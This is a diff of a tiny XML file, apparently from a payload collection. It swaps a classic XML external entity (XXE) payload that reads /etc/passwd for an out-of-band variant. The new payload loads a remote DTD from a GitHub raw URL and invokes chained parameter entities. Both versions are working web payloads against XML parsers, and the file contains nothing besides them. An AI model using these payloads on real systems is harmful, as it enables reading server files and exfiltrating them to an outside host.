@@ -1,4 +1,3 @@
-<?xml version="1.0"?>
-<!DOCTYPE foo [  
-<!ELEMENT foo (#ANY)>
-<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE a [ <!ENTITY % remote SYSTEM "https://raw.githubusercontent.com/leo1h3k1ng/xxe/main/file.dtd">%remote;%int;]>
+<a>&trick;</a>
